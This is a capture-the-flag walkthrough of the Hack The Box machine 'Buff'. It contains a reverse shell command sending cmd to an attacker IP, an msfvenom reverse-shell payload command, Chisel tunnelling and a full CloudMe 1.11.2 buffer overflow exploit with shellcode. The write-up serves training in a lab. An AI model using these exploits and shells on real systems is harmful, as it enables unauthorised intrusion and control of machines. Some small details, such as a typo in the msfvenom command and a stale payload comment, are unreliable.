---
icon: windows
---

# Buff - Easy

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/buff"><strong>Buff</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.198 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 10:57 EST
Nmap scan report for 10.10.10.198
Host is up (0.041s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   64.04 ms 10.10.16.1
2   64.08 ms 10.10.10.198

```

### <mark style="color:$primary;">HTTP Port 8080 TCP</mark>

```bash
└─$ curl -I http://10.10.10.198:8080/
HTTP/1.1 200 OK
Date: Mon, 17 Nov 2025 01:08:47 GMT
Server: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
X-Powered-By: PHP/7.4.6
Set-Cookie: sec_session_id=r5ogkg8rijida2g305m7rhdmau; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: sec_session_id=aa2h30cjfvbukkcivk71cmefid; path=/; HttpOnly
Content-Type: text/html; charset=UTF-8
```

We know this is a php Site. Let's check it out

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Gym Management System 1.0 Unauthenticated RCE</mark>

<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The contact page reveals the software used and version! Let's check if there are any exploits available for it

<figure><img src="../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Found an unauthenticated RCE! Let's download it and give it a try

```bash
searchsploit -m 48506
```

```bash
python2 48506.py http://10.10.10.198:8080/
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Upgrade Shell</mark>

Let's get a better shell. I'll set up a simple smbshare and copy nc64.exe to the target machine

```bash
impacket-smbserver share . -smb2support
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
net use \\10.10.16.2\share
```

```bash
copy \\10.10.16.2\share\nc64.exe c:\users\shaun\nc64.exe
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now to get a reverse shell make sure you have a listener ready on port 8080 then run the following command

```bash
C:\users\shaun\nc64.exe -e cmd 10.10.16.2 8080
```

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

There is an interesting .exe file in shaun's downloads directory!

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After a quick search there is a POC buffer overflow available for this version!&#x20;

Let's check and see if the application is running on the machine!

Checking netstat shows 2 ports listening on localhost 3306 which is MySQL that is being used by the site hosted on port 8080. But we also see an interesting port 8888 listening on localhost this must be the CloudMe app!

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">CloudMe v 1.11.2 Buffer Overflow Privesc</mark>

The exploit we discovered earlier is in python, python is not inherently on windows machines. So I am going to setup a tunnel to port 8888 to exploit it.

I will make use of the smb share I created earlier to deliver chiesel to the target machine

#### <mark style="color:$primary;">Tunnel using Chisel</mark>

{% code overflow="wrap" %}
```bash
copy \\10.10.16.2\share\chisel_1.10.1_windows_amd64 c:\users\shaun\chisel_1.10.1_windows_amd64.exe
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Setting up the tunnel

```bash
./chisel_1.10.1_linux_amd64 server -p 8000 --reverse
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
c:\users\shaun\chisel_1.10.1_windows_amd64.exe client 10.10.16.2:8000 R:8888:localhost:8888
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

It's connected! To verify just in case run netst

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">Modifying the exploit</mark>

The exploit simply opens up the calc.exe app we need to modify it.

Let's create our payload that gives us a reverse shell:

{% code overflow="wrap" %}
```bash
sfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=8080 -b '\x00\x0A\x0D' -f python -v payload
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now let's update our exploit with the newly created payload. The target and port variables will stay the same for our use case.

### Exploit

```python
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""                                                                                                                                      
payload += b"\xdb\xd6\xd9\x74\x24\xf4\xbf\xb1\xd0\xbd\xa7"                                                                                          
payload += b"\x58\x33\xc9\xb1\x52\x31\x78\x17\x03\x78\x17"                                                                                          
payload += b"\x83\x59\x2c\x5f\x52\x65\x25\x22\x9d\x95\xb6"                                                                                          
payload += b"\x43\x17\x70\x87\x43\x43\xf1\xb8\x73\x07\x57"                                                                                          
payload += b"\x35\xff\x45\x43\xce\x8d\x41\x64\x67\x3b\xb4"                                                                                          
payload += b"\x4b\x78\x10\x84\xca\xfa\x6b\xd9\x2c\xc2\xa3"                                                                                          
payload += b"\x2c\x2d\x03\xd9\xdd\x7f\xdc\x95\x70\x6f\x69"                                                                                          
payload += b"\xe3\x48\x04\x21\xe5\xc8\xf9\xf2\x04\xf8\xac"                                                                                          
payload += b"\x89\x5e\xda\x4f\x5d\xeb\x53\x57\x82\xd6\x2a"                                                                                          
payload += b"\xec\x70\xac\xac\x24\x49\x4d\x02\x09\x65\xbc"                                                                                          
payload += b"\x5a\x4e\x42\x5f\x29\xa6\xb0\xe2\x2a\x7d\xca"                                                                                          
payload += b"\x38\xbe\x65\x6c\xca\x18\x41\x8c\x1f\xfe\x02"                                                                                          
payload += b"\x82\xd4\x74\x4c\x87\xeb\x59\xe7\xb3\x60\x5c"                                                                                          
payload += b"\x27\x32\x32\x7b\xe3\x1e\xe0\xe2\xb2\xfa\x47"                                                                                          
payload += b"\x1a\xa4\xa4\x38\xbe\xaf\x49\x2c\xb3\xf2\x05"                                                                                          
payload += b"\x81\xfe\x0c\xd6\x8d\x89\x7f\xe4\x12\x22\x17"                                                                                          
payload += b"\x44\xda\xec\xe0\xab\xf1\x49\x7e\x52\xfa\xa9"                                                                                          
payload += b"\x57\x91\xae\xf9\xcf\x30\xcf\x91\x0f\xbc\x1a"                                                                                          
payload += b"\x35\x5f\x12\xf5\xf6\x0f\xd2\xa5\x9e\x45\xdd"                                                                                          
payload += b"\x9a\xbf\x66\x37\xb3\x2a\x9d\xd0\xb6\xa0\x8d"                                                                                          
payload += b"\x22\xaf\xb6\xad\x3d\xbf\x3e\x4b\x2b\xaf\x16"                                                                                          
payload += b"\xc4\xc4\x56\x33\x9e\x75\x96\xe9\xdb\xb6\x1c"                                                                                          
payload += b"\x1e\x1c\x78\xd5\x6b\x0e\xed\x15\x26\x6c\xb8"                                                                                          
payload += b"\x2a\x9c\x18\x26\xb8\x7b\xd8\x21\xa1\xd3\x8f"                                                                                          
payload += b"\x66\x17\x2a\x45\x9b\x0e\x84\x7b\x66\xd6\xef"
payload += b"\x3f\xbd\x2b\xf1\xbe\x30\x17\xd5\xd0\x8c\x98"
payload += b"\x51\x84\x40\xcf\x0f\x72\x27\xb9\xe1\x2c\xf1"
payload += b"\x16\xa8\xb8\x84\x54\x6b\xbe\x88\xb0\x1d\x5e"
payload += b"\x38\x6d\x58\x61\xf5\xf9\x6c\x1a\xeb\x99\x93"
payload += b"\xf1\xaf\xaa\xd9\x5b\x99\x22\x84\x0e\x9b\x2e"
payload += b"\x37\xe5\xd8\x56\xb4\x0f\xa1\xac\xa4\x7a\xa4"
payload += b"\xe9\x62\x97\xd4\x62\x07\x97\x4b\x82\x02"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
```

Now to execute it make sure to have a listener ready on port 8080

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And we got a shell as root!
